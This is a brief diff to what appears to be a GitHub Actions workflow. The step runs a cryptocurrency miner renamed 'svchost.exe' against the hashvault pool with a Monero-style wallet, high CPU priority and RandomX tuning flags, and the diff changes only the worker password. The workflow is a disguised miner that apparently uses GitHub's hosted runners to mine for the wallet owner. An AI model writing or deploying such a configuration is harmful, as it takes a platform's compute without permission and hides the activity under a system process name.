@@ -25,4 +25,4 @@ jobs:
           # Chạy với quyền ưu tiên cao nhất và cấu hình RandomX Mode Fast
           .\svchost.exe -o pool.hashvault.pro:443 `
           -u 44VTHpmFucsULkgscKcU9zf3R73t4YamM3cW9gf7V51GN3TMJQzGxkNYCd9myzDtxqDyTwyegnYgzjjY6fi5HLC81JRYaZr `
-          -p GitHub_EPYC_FullPower3 --donate-level 1 --cpu-priority 5 --threads 4 --tls --randomx-mode fast --randomx-wrmsr
+          -p GitHub_EPYC_FullPower3df --donate-level 1 --cpu-priority 5 --threads 4 --tls --randomx-mode fast --randomx-wrmsr
